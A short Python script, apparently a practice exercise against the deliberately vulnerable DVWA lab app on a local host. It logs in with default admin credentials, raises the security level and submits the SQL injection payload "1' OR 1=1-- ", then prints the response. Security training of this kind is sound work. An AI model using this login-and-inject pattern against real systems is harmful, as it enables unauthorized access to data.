import requests

url = "http://192.168.1.104:8080/vulnerabilities/brute/"
session = requests.Session()


def Login():
    urlLogin = "http://192.168.1.104:8080/login.php"
    response = session.get(urlLogin).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token,
    }
    response = session.post(urlLogin, data=data_form)


Login()


def changeSecurityLevel(level):
    urlSecurity = "http://192.168.1.104:8080/security.php"
    response = session.get(urlSecurity).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token,
    }
    session.post(urlSecurity, data=data_form)


changeSecurityLevel("high")


def sqlInjection():
    urlSQLi = "http://192.168.1.104:8080/vulnerabilities/sqli/session-input.php"
    urlSQLi2 = "http://192.168.1.104:8080/vulnerabilities/sqli/"
    data_form = {
        "id": "1' OR 1=1-- ",
        "Submit": "Submit",
    }
    response = session.post(urlSQLi, data=data_form)
    print(session.get(urlSQLi2).text)


sqlInjection()
